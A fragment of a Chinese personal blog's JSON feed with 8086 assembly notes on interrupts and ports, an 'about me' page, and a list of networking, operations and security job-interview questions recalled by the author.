CS=(n*4+2)</code></p>\n<p>可以不做触发，通过 int 执行 0 号中断</p>\n<p>int 一般和 iret 指令配合使用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\">code segment</span><br><span class=\"line\"></span><br><span class=\"line\">start:</span><br><span class=\"line\">\t\tmov ax,cs</span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\tmov si,offset capital</span><br><span class=\"line\">\t\tmov ax,0</span><br><span class=\"line\">\t\tmov es,ax</span><br><span class=\"line\">\t\tmov di,200h</span><br><span class=\"line\">\t\tmov cx,offset capitalend - offset capital</span><br><span class=\"line\">\t\tcld</span><br><span class=\"line\">\t\trep movsb</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmov ax,0</span><br><span class=\"line\">\t\tmov es,ax</span><br><span class=\"line\">\t\tmov word ptr es:[7ch*4],200h</span><br><span class=\"line\">\t\tmov word ptr es:[7ch*4+2],0</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmov ax,4c00h</span><br><span class=\"line\">\t\tint 21h</span><br><span class=\"line\"></span><br><span class=\"line\">capital:</span><br><span class=\"line\">\t\tpush cx</span><br><span class=\"line\">\t\tpush si</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">change: </span><br><span class=\"line\">\t\tmov cl,[si]</span><br><span class=\"line\">\t\tmov ch,0</span><br><span class=\"line\">\t\tjcxz ok</span><br><span class=\"line\">\t\tand byte ptr [si],11011111b</span><br><span class=\"line\">\t\tinc si</span><br><span class=\"line\">\t\tjmp short change</span><br><span class=\"line\">ok:\t</span><br><span class=\"line\">\t\tpop si</span><br><span class=\"line\">\t\tpop cx</span><br><span class=\"line\">\t\tiret</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">capitalend:nop</span><br><span class=\"line\"></span><br><span class=\"line\">code ends</span><br><span class=\"line\"></span><br><span class=\"line\">end start</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>int 10h 是 bios 中断例程</p>\n<p>BIOS 和 DOS 中断例程用 ah 来传递子程序的编号</p>\n<p><code>(ah)=2表示调用第10h号中断例程的 2号子程序，功能为设置光标位置，可以提供光标所在的行号（80*25字符模式下:0~24 ),列号（80*25字符模式下: 0~79)，和页号作为参数。(bh)=6 , (dh)=5, (d1)=12，设置光标到第0页，第5行，第12列。</code></p>\n<p>内存地址中 B8000-BFFFFh 共 32kb，为显示缓冲区</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">;编程：在屏幕的5行12列显示3个红底高亮闪烁绿色的‘a’。</span><br><span class=\"line\"></span><br><span class=\"line\">assume cs:code</span><br><span class=\"line\">code segment</span><br><span class=\"line\">\tmov ah,2 \t;置光标</span><br><span class=\"line\">\tmov bh,0\t;第0页</span><br><span class=\"line\">\tmov dh,5\t;dh中放行号</span><br><span class=\"line\">\tmov dl,12\t;dl中放列号</span><br><span class=\"line\">\tint 10h\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tmov ah,9\t;置光标</span><br><span class=\"line\">\tmov al,&#x27;a&#x27;\t;字符</span><br><span class=\"line\">\tmov bl,11001010b;颜色属性</span><br><span class=\"line\">\tmov bh,0\t;第0页</span><br><span class=\"line\">\tmov cx,3\t;字符重复个数</span><br><span class=\"line\">\tint 10h</span><br><span class=\"line\"></span><br><span class=\"line\">\tmov ax,4c00h</span><br><span class=\"line\">\tint 21h </span><br><span class=\"line\"></span><br><span class=\"line\">code ends</span><br><span class=\"line\">end</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>int 21H</p>\n<p>int 21h 中断例程是 DOS 提供的中断例程，其中包含了 DOS 提供给程序员在编程时调用为子程序</p>\n<p>我们从前一直使用的是 int 21 中断例程 4ch 号功能，即程序返回功能</p>\n<p>mov ah,4ch  ; 程序返回</p>\n<p>mov al,0        ; 返回值</p>\n<p>int 21h</p>\n<h2 id=\"端口\"><a class=\"markdownIt-Anchor\" href=\"#端口\">#</a> 端口</h2>\n<p>端口读写指令 in 和 out 分别用于读取和写入数据</p>\n<p>in al,60h</p>\n<p>从 60h 号端口读入一个字节</p>\n<p>在 in out 指令中，只能使用 ax 或 al 来存放从端口中读入的数据或要发送到端口中的数据</p>\n<p>in al,20h</p>\n<p>out 20h,al</p>\n<p>CMOS RAM</p>\n<p>包含一个时钟和一个有 128 位存储单元的 RAM 存储区</p>\n<p>128 个字节中，内部时钟占用 0-0dh，其余大部分单元用于保存系统配置信息</p>\n<p>BIOS 中有两个端口，为 70h 和 71h，通过这两个端口读取 CMOS RAM</p>\n<p>70h 为地址，存放 CMOS RAM 单元地址，71 为数据端口，存放选定的 CMOS RAM 读取的数据</p>\n<p>shl 和 shr</p>\n<p>逻辑移位指令</p>\n<p>shl 逻辑左移指令</p>\n<p>将一个数据向左移位，最后移除的移位写入 cf，最低位 0 补充，数据可以来自寄存器或内存单元</p>\n<p>移位位数大于 1 时，必须将移动位数放入 cl</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov al,01010001b</span><br><span class=\"line\">mov cl,3</span><br><span class=\"line\">shl al,cl    ;从al拿出来在放回al去</span><br></pre></td></tr></table></figure>\n<p>shr</p>\n<p>和 shl 相反</p>\n<p>右移 = / 2</p>\n<p>CMOS RAM 中时间信息</p>\n<p>秒 00H</p>\n<p>分 02H</p>\n<p>时 04H</p>\n<p>日 07H</p>\n<p>月 08H</p>\n<p>年 09H</p>\n<p>他们都占一个字节，以 BCD 码存放</p>\n<h2 id=\"外中断\"><a class=\"markdownIt-Anchor\" href=\"#外中断\">#</a> 外中断</h2>\n<p>CPU 通过端口和外部设备进行联系</p>\n<p>外中断源有两类</p>\n<p>1. 可屏蔽中断</p>\n<p>2. 不可屏蔽中断</p>\n<p>IF=1 响应中断过程</p>\n<p>IF=0 不响应中断过程</p>\n<p>sti 设置 IF=1</p>\n<p>cli 设置 IF=0</p>\n<p>PC 机键盘处理过程</p>\n<p>引发 9 号中断</p>\n<p>— 般将按下一个键时产生的扫描码称为通码，松开一个键产生的扫描码称为断码</p>\n<p>断码 = 通码 + 80H</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108214017480.png\" alt=\"image-20221108214017480\" style=\"zoom:50%;\" />\n",
            "tags": [
                "汇编"
            ]
        },
        {
            "id": "http://example.com/2022/10/30/%E5%8F%91%E7%8E%B0%E5%B0%8F%E5%8F%AF%E7%88%B1%EF%BC%81/",
            "url": "http://example.com/2022/10/30/%E5%8F%91%E7%8E%B0%E5%B0%8F%E5%8F%AF%E7%88%B1%EF%BC%81/",
            "title": "about me",
            "date_published": "2022-10-30T06:09:01.098Z",
            "content_html": "<p>Welcome to my blog!</p>\n<h2 id=\"you-can-find-me-in-the-following-ways\"><a class=\"markdownIt-Anchor\" href=\"#you-can-find-me-in-the-following-ways\">#</a> You can find me in the following ways</h2>\n<p>1.Contact with WeChat or QQ ：183108913</p>\n<p>2.When you come to Xi’an, we can have an offline meeting</p>\n<h2 id=\"about-me\"><a class=\"markdownIt-Anchor\" href=\"#about-me\">#</a> About me</h2>\n<p>no introduction</p>\n<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"markdownIt-Anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"markdownIt-Anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"markdownIt-Anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"markdownIt-Anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"markdownIt-Anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: [Deployment](</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">https://hexo.io/docs/one-command-deployment.html</span>)</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/10/28/%E7%A7%8B%E6%8B%9B%E9%9D%A2%E8%AF%95%E9%A2%98/",
            "url": "http://example.com/2022/10/28/%E7%A7%8B%E6%8B%9B%E9%9D%A2%E8%AF%95%E9%A2%98/",
            "title": "秋招面试题",
            "date_published": "2022-10-28T05:38:45.000Z",
            "content_html": "<h1 id=\"秋招面试题\"><a class=\"markdownIt-Anchor\" href=\"#秋招面试题\">#</a> 秋招面试题</h1>\n<h2 id=\"1特斯拉-网络工程师-一面\"><a class=\"markdownIt-Anchor\" href=\"#1特斯拉-网络工程师-一面\">#</a> 1. 特斯拉 - 网络工程师 - 一面</h2>\n<blockquote>\n<p>0. 自我介绍 (不限语言)</p>\n<p>1. 有哪些直辖市</p>\n<p>2. 鲁迅故居</p>\n<p>3. 东三省</p>\n<p>4. 曹操哪个朝代</p>\n<p>5. 唐宋八大家</p>\n<p>6. 苏轼苏洵苏辙 关系</p>\n<p>7. 表格堂哥区别</p>\n<p>6.DHCP 工作原理</p>\n<p>7.DNS port</p>\n<p>8.dhcp 配置时 IP helper-address</p>\n<p>9.Liunx 内核，发行版</p>\n<p>10.mac 地址哪一层</p>\n<p>11. 网管干啥</p>\n<p>12.aws 干啥</p>\n<p>13. 项目和实习时的区别</p>\n<p>14. 能用 python 写一些自动获取 ip 的脚本吗，不是 dhcp，是 SDN 那类</p>\n<p>15.kali 一般用那些工具</p>\n<p>16. 生涯规划 你到底要干安全还是网络<br>\n (面网络别提安全)</p>\n<p>17. 你还有啥想问的</p>\n<p>立即推 ， 当场送走</p>\n<p>一共 22 分钟，两个面试官，先问常识，再问网络，最后实习项目校园经历，一般都是按照简历顺序问的</p>\n</blockquote>\n<h2 id=\"2理想汽车-安全运营-一面\"><a class=\"markdownIt-Anchor\" href=\"#2理想汽车-安全运营-一面\">#</a> 2. 理想汽车 - 安全运营 - 一面</h2>\n<blockquote>\n<p>有啥安全相关的项目或者实习经历<br>\n答：没有，但我干过 CTF</p>\n<p>CTF 那件事情你最印象深刻<br>\n答：php 反序列化<br>\n此处省略 1k 字<br>\n从原理防御 到 pop 链</p>\n<p>既然说到了 pop 链，说说看 php 里面的魔法方法吧</p>\n<p>说到了 wakeup 绕过，这个在 php 某些版本有用，还是通杀<br>\n答：只记得是 cve 漏洞，在 &lt; 7.0 的版本测试过</p>\n<p>逻辑漏洞任意邮箱注册怎么修 指的是激活账号时修改邮箱导致任意邮箱注册，也可以理解为任意邮箱激活<br>\n答：加 token 追问：在哪加，是注册的时候加，还是激活的时候加<br>\n寄</p>\n<p>富文本编辑器 XSS 怎么修</p>\n<p>sql 注入防御</p>\n<p>PDO 在无法限制的场景比如 order by 该怎么办</p>\n<p>以上三道及回答均在胡扯，答案自己百度去吧</p>\n<p>入侵排查 排查哪些 shell 脚本一般要写哪些</p>\n<p>追问 netstat 怎么查看，那么多 ip 那个是危险的<br>\n - lntup grep establish<br>\n 怎么找到进程<br>\n有对应的 PID<br>\n 排查进程启动项…</p>\n<p>渗透的时候印象深刻的事<br>\n横向，向日葵</p>\n<p>discuz 漏洞复现<br>\n任意文件删除 cookie 存注入</p>\n<p>cookie 对单个参数限制长度，如何绕过</p>\n<p>能用 sqlmap 为啥还要自己写脚本</p>\n<p>Python 私有方法 lamdba 表达式 map sum<br>\na[1,2,3,4,5]<br>\na[1::3]<br>\nsum(map(lamdba(x:x+3))) == 13</p>\n<p>数组切片</p>\n<p>对于出现了 0day，该怎么对公司资产进行排查</p>\n<p>全程大概 1 个小时，人都麻了</p>\n</blockquote>\n<h2 id=\"3快手-idc运营网络方向-一面\"><a class=\"markdownIt-Anchor\" href=\"#3快手-idc运营网络方向-一面\">#</a> 3. 快手 - IDC 运营网络方向 - 一面</h2>\n<blockquote>\n<p>我看你写的网络工程，讲讲你的专业课掌握程度<br>\n答：tcpip 会一点，网络编程一般</p>\n<p>专业排名</p>\n<p>tcpip 滑动窗口原理 滑动窗口初始值是多少<br>\n慢启动是啥<br>\n tcpip 多少层，都是啥，每层作用 (参考数据包的封装 解封装)<br>\n tcp syc flood 原理防御<br>\n答：限制连接数和连接时间<br>\n然后用他就反驳了我，这两个办法都有待商榷</p>\n<p>ospf<br>\n 负载分担怎么实现 答：开销<br>\n两台路由器之间取消负载分担，只需要 A-&gt;B 不负载分担，回程不管，在哪配开销，为什么 答：在 A 配，路由表的原因<br>\n那 b 呢，如果不配来回路径不一致会有问题吗</p>\n<p>一个区域中如果网络类型为 p2p 会有几类 LSA</p>\n<p>lsa 类型 只需要说常见的既可以</p>\n<p>ospf 防环 区域间区域内</p>\n<p>spf 算法</p>\n<p>bgp 属性</p>\n<p>origin network 路由和汇总路由都是什么 origin 不同 origin 优先级那个更优 origin 怎么控制选路 答： bgprou -&gt; iprou</p>\n<p>双点双向 重发布</p>\n<p>项目 交换机类型 上下连 端口 收敛比</p>\n<p>全程 35 分钟左右，我又又又裂开了</p>\n</blockquote>\n<h2 id=\"4shareit-sre-一面\"><a class=\"markdownIt-Anchor\" href=\"#4shareit-sre-一面\">#</a> 4.SHAREit - SRE - 一面</h2>\n<blockquote>\n<p>接不接受 7*24oncall</p>\n<p>crontab * 字段含义</p>\n<p>Linux 版本</p>\n<p>http 状态码</p>\n<p>tcp 和 udp 区别</p>\n<p>怎样学习新知识</p>\n<p>k8s 了解</p>\n<p>怎样看文件夹大小 (du)</p>\n<p>分区挂载过程</p>\n<p>mysql 新建用户</p>\n<p>mysql 查看权限</p>\n<p>如果在周末出了 serv2 你第一个看到你怎么做</p>\n<p>使用过公有云吗</p>\n<p>有哪些负载均衡器</p>\n<p>有哪些监控软件</p>\n<p>怎样查看和本机建立了连接的 IP</p>\n<p>怎么判断主机之间是否连通</p>\n<p>怎么样判断主机之间端口是否开放</p>\n<p>用过 python 和 shell 吗，用 python 干了啥，用 shell 干了啥</p>\n</blockquote>\n<h2 id=\"5信锐-技术服务工程师-一面\"><a class=\"markdownIt-Anchor\" href=\"#5信锐-技术服务工程师-一面\">#</a> 5. 信锐 - 技术服务工程师 - 一面</h2>\n<blockquote>\n<p>自我介绍</p>\n<p>实习干啥的</p>\n<p>访问网页过程</p>\n<p>电脑获取地址方法 (讲了手工配和 dhcp, 详细讲了 dhcp)</p>\n<p>接上一题：你说 dhcp 有哪些报文？</p>\n<p>路由协议分类</p>\n<p>讲一种你熟悉的路由协议</p>\n<p>学习方法 (怎样学习新知识)</p>\n<p>网管干啥的 (简历上的，在学校担任过)</p>\n<p>讲了一下在学校 troubleshooting 的思路</p>\n<p>唐都项目干啥的</p>\n<p>讲了一下干了个啥</p>\n<p>生涯规划</p>\n<p>还有啥问题想问的</p>\n</blockquote>\n<h2 id=\"6信锐-技术支持-二面\"><a class=\"markdownIt-Anchor\" href=\"#6信锐-技术支持-二面\">#</a> 6. 信锐 - 技术支持 - 二面</h2>\n<blockquote>\n<p>自我介绍</p>\n<p>网络通信两种模型，区别<br>\n OSI TCP</p>\n<p>怎么保证可靠性和安全性<br>\n冗余 安全</p>\n<p>为什么要考 ie<br>\n 先说了一个技术方面，他说只有技术吗，没有对职业的规划？我后面补充了我是网工的啦，以后想干这行啦，最后也扯回到了职业规划</p>\n<p>ie 证书咋考的，为啥第一次面试没过，我说项目题挂了，他追问有哪些项目题，我说了一个企业网架构，三层架构，他追问每一层是干啥的，用到啥技术</p>\n<p>追着项目往死里问，问我为啥一个项目能做两个月，咋割接的，都 tm 快和他吵起来了，我和他讲是因为配置迁移问题，他死活说有问题</p>\n<p>唐都那个项目干啥了<br>\n简单说了一下排错和优化</p>\n<p>有啥没考过的证书</p>\n<p>过去一年最难的事<br>\n考 ie</p>\n<p>大学中印象最深的事<br>\n奖学金</p>\n<p>生涯规划</p>\n<p>你觉得和别人相比，你的优势是什么<br>\n我说我对于设备更了解一些啦</p>\n<p>有女朋友吗，为什么不找。那你是从来没谈过吗，高中谈过吗<br>\n沉迷学习，日渐消瘦</p>\n<p>如果有个你很喜欢的姑娘，但你父母死活不同意，怎么办<br>\n沟通，然后他就搞了各种各样的</p>\n<p>对技术支持的了解<br>\n对接客户和工程师</p>\n<p>以上两个是对逻辑的考察，评价是整体偏弱，需要考虑客户的痛点</p>\n<p>还有啥问题，我问的除了我说的两条，还有对于技术支持的工作还有什么补充的吗，他说的上面那条逻辑偏差</p>\n</blockquote>\n<h2 id=\"7深信服-安全服务-一面\"><a class=\"markdownIt-Anchor\" href=\"#7深信服-安全服务-一面\">#</a> 7. 深信服 - 安全服务 - 一面</h2>\n<blockquote>\n<p>自我介绍</p>\n<p>三层交换机和二层交换机的区别</p>\n<p>查看用户历史命令 怎么查看别人的历史命令</p>\n<p>文件上传 getshell 了但不能链接怎么排查</p>\n<p>你熟悉那种漏洞<br>\n答：sql 注入</p>\n<p>sql 注入有哪几种</p>\n<p>union select 后面可以跟 union select insert 吗</p>\n<p>union select 叫啥名字</p>\n<p>怎么通过数据库获取系统权限 mysql 呢，SQL server 呢<br>\n答 mysql 可以写 shell<br>\n 估计是想听 mysql 提权</p>\n<p>mysql 写 shell 的命令是啥</p>\n<p>堆叠注入原理</p>\n<p>堆叠注入和 union select 有啥区别</p>\n<p>报错注入原理，语句</p>\n<p>时间盲注原理，语句</p>\n<p>shrio 反序列化，fastjson 反序列化</p>\n<p>struct 漏洞<br>\n答：三个都不会</p>\n<p>讲讲 Java 反序列化</p>\n<p>内网渗透搭隧道怎么搭<br>\n答：可以用 earthworm</p>\n<p>earthworm 三种模式</p>\n<p>还有其他方法吗</p>\n<p>内网横向有哪些方法<br>\n答：ipc wmin psexec</p>\n<p>psexec 忘了问了啥了</p>\n<p>wmin 端口是啥，横向之后是什么权限</p>\n<p>权限维持有哪几种</p>\n<p>有安全项目和实习嘛</p>\n<p>怎么学习</p>\n<p>职业规划</p>\n<p>机构的课程结束了嘛</p>\n<p>有你印象的技术类博客嘛</p>\n</blockquote>\n<h2 id=\"8安天-网络安全管培生一面\"><a class=\"markdownIt-Anchor\" href=\"#8安天-网络安全管培生一面\">#</a> 8. 安天 - 网络安全管培生一面</h2>\n<blockquote>\n<p>我的自我介绍</p>\n<p>对于安全的理解</p>\n<p>学校主修的除了网安还有啥</p>\n<p>项目有啥和安全相关的</p>\n<p>实习有啥和安全相关的</p>\n<p>登录框有啥漏洞</p>\n<p>入侵排查</p>\n<p>讲讲你学的，举个例子<br>\n异或取反 beef</p>\n<p>有很多项目同时给你你咋办</p>\n<p>我们在沈阳北京哈尔滨都有站点，但沈阳是小站点，你怎么规划，如果你 base 沈阳</p>\n<p>如果你带领五个人的团队你怎么管理</p>\n<p>你又要干技术又要管理你怎么办</p>\n<p>网管碰到棘手的人咋办</p>\n<p>这哥们第一年招管培生和我谈论今天穿了什么</p>\n<p>你对于职业规划</p>\n<p>上一个来的是个 985 博士，已经研究员了</p>\n</blockquote>\n<h2 id=\"9长亭-技术支持-一面\"><a class=\"markdownIt-Anchor\" href=\"#9长亭-技术支持-一面\">#</a> 9. 长亭 - 技术支持 - 一面</h2>\n<blockquote>\n<p>自我介绍</p>\n<p>印象深刻项目<br>\n说了说割接</p>\n<p>然后问的挺详细</p>\n<p>实习经历</p>\n<p>说说看交换机 troubleshooting</p>\n<p>说说看服务器 troubleshooting</p>\n<p>有部署会操作系统吗<br>\n没有他们都是 pxe</p>\n<p>ce 和 ie 啥时候考的</p>\n<p>我看你网络的，说说 osi 每层协议</p>\n<p>osi 封装解封装</p>\n<p>tcp 四次挥手 timewait</p>\n<p>为啥握手三次挥手四次</p>\n<p>http 有哪几个版本，区别是啥</p>\n<p>https 原理<br>\n http 有哪些组成<br>\n头 行</p>\n<p>拿 linux 搭过什么服务<br>\n搭过网站</p>\n<p>哪些网站，怎么搭的</p>\n<p>nigix 搭过吗，讲讲特性</p>\n<p>nginx 有哪些负载分担模式</p>\n<p>邮件搭过吗 dns 搭过吗</p>\n<p>dns 原理是啥<br>\n我不知道于是我开始扯 log4j2 dnslog 外带</p>\n<p>我看你安全很懂哦，说说看 xss<br>\n 命名空间混淆突变，dom 破坏</p>\n<p>waf 是干啥的，那一层的</p>\n<p>类似于生涯规划的问题</p>\n<p>说说看你对长亭的理解</p>\n<p>说说看你对岗位的理解</p>\n<p>工作地点</p>\n<p>Q&amp;A</p>\n</blockquote>\n<h2 id=\"10宏杉-技术支持-一面\"><a class=\"markdownIt-Anchor\" href=\"#10宏杉-技术支持-一面\">#</a> 10. 宏杉 - 技术支持 - 一面</h2>\n<blockquote>\n<p>自我介绍</p>\n<p>考研吗考公吗</p>\n<p>大学啥专业，为啥投这个岗位</p>\n<p>证书自己花钱还是父母的钱</p>\n<p>ie 多少钱</p>\n<p>为啥考</p>\n<p>六级多少分四级多少分</p>\n<p>籍贯</p>\n<p>面试通过多久过来实习</p>\n<p>路由协议有哪些</p>\n<p>生成树作用</p>\n<p>super vlan</p>\n<p>dhcp</p>\n<p>链路聚合协议哪几种优缺点</p>\n<p>linux 启动过程</p>\n<p>定时任务</p>\n<p>全国分配可以接受？</p>\n<p>明年过年结束后可以过来</p>\n<p>家里干啥的</p>\n<p>兄弟姐妹几个</p>\n<p>期望薪资</p>\n</blockquote>\n<h2 id=\"11中科曙光-云平台网络研发工程师-一面\"><a class=\"markdownIt-Anchor\" href=\"#11中科曙光-云平台网络研发工程师-一面\">#</a> 11. 中科曙光 - 云平台网络研发工程师 - 一面</h2>\n<blockquote>\n<p>1.OSI 二层和三层有哪些协议</p>\n<p>2. 用过防火墙吗，有哪些功能，怎么保证安全，内部实现</p>\n<p>3.VPN 用过吗，IPSEC 详细原理了解过吗</p>\n<p>4.DHCP 报文交互过程，重启虚拟机发什么包</p>\n<p>5. 服务器端口没有 up</p>\n<p>6. 交换机端口没有 up</p>\n<p>7. 链路捆绑，两个端口 LACP 断了一边</p>\n<p>8. 开发接触过吗，python 作过哪些项目</p>\n<p>9. 毕业论文</p>\n<p>10. 啥时候实习</p>\n</blockquote>\n<h2 id=\"12汉德-云解决方案工程师-一面\"><a class=\"markdownIt-Anchor\" href=\"#12汉德-云解决方案工程师-一面\">#</a> 12. 汉德 - 云解决方案工程师 - 一面</h2>\n<blockquote>\n<p>0x00<br>\n 这家是秋招面了四五十家技术含量最高的企业，没有之一，问的太广了，问的还很深，扛不住扛不住，告辞</p>\n<p>linux<br>\n1.linux 进程状态<br>\n 3 running, 144 sleeping, 0 stopped, 1 zombie</p>\n<p>2. 检查服务是否运行</p>\n<p>3. 查看服务器 CPU，内存，磁盘利用率，linux 版本<br>\n内存：<br>\n[lighthouse@VM-16-11-centos ~]$ free<br>\ntotal used free shared buff/cache available<br>\nMem: 1881996 577340 112936 17348 1191720 1091156<br>\nSwap: 1049596 524544 525052<br>\n/proc/meminfo 内存<br>\n vmstat 内存<br>\n top 命令一般用于查看进程的 CPU 和内存使用情况<br>\n df -h lsblk fdisk -l 硬盘</p>\n<p>4.crontab<br>\n5. 常用 linux 命令<br>\n 6. 更改文件权限 chmod</p>\n<p>网络<br>\n 1.tcp 和 udp 区别<br>\n 2.get 和 post 区别<br>\n 3. 访问 www.xxx.com 发生了什么<br>\n 4.cookie 和 session 区别<br>\n 5. 状态码</p>\n<p>安全<br>\n 1.sql 注入，防御<br>\n 2. 安全工具<br>\n 3. 靶场<br>\n 4. 有哪些加密算法</p>\n<p>mysql<br>\n1.acid<br>\n2.mysql 锁<br>\n 3. 隔离界别<br>\n 4. 主键，外键，主键和索引区别</p>\n<p>操作系统<br>\n死锁<br>\n预防死锁<br>\n内存泄漏</p>\n<p>项目<br>\n实习</p>\n<p>比赛经历</p>\n<p>猜数字<br>\n四个数字不重复<br>\n 3456 1A 1B A 代表位置数字正确 B 代表只有数字正确</p>\n</blockquote>\n<h2 id=\"13宏杉-技术支持-二面\"><a class=\"markdownIt-Anchor\" href=\"#13宏杉-技术支持-二面\">#</a> 13. 宏杉 - 技术支持 - 二面</h2>\n<blockquote>\n<p>DRBDR</p>\n<p>LVM 磁盘满了，用另一块磁盘扩容的命令</p>\n<p>工作地点</p>\n<p>你的你的同事做一个项目，因为同事的原因失败了，领导批评了你，你怎么办</p>\n<p>领导给你一个你不会做的比较难的任务，你怎么办</p>\n<p>生涯规划，啥时候来实习</p>\n</blockquote>\n<h2 id=\"14中科闻歌-运维工程师-一面\"><a class=\"markdownIt-Anchor\" href=\"#14中科闻歌-运维工程师-一面\">#</a> 14. 中科闻歌 - 运维工程师 - 一面</h2>\n<blockquote>\n<p>OSI 模型</p>\n<p>STP 选举</p>\n<p>防火墙用过吗，啥型号的，A 访问 B 时在防火墙配置单向还是双向，如果是交换机，需要配置单向还是双向</p>\n<p>BGP 选路</p>\n<p>OSPF 邻居建立</p>\n<p>项目</p>\n</blockquote>\n<h2 id=\"15吉利英伦-网络管理专员-一面\"><a class=\"markdownIt-Anchor\" href=\"#15吉利英伦-网络管理专员-一面\">#</a> 15. 吉利英伦 - 网络管理专员 - 一面</h2>\n<blockquote>\n<p>200-300 人的小型网怎么做<br>\n 200-300 人的小型网怎么做<br>\n我说三层，他说只有接入和核心</p>\n<p>链路选择，光还是电，都用在什么场景，传输距离</p>\n<p>有哪些 vpn<br>\n 他说现在都是硬件的，ipsec</p>\n<p>lvm 是啥</p>\n<p>iaas paas saas</p>\n<p>链路可靠性 (聚合</p>\n<p>堆叠，假如五台做堆叠，有一台有上联，怎么搞，堆叠需要啥<br>\n需要堆叠线缆</p>\n<p>怎么控制访问，比如不让访问 qq</p>\n<p>有哪些 cs 的服务，我说 web，他追问中间件有哪些， nginx 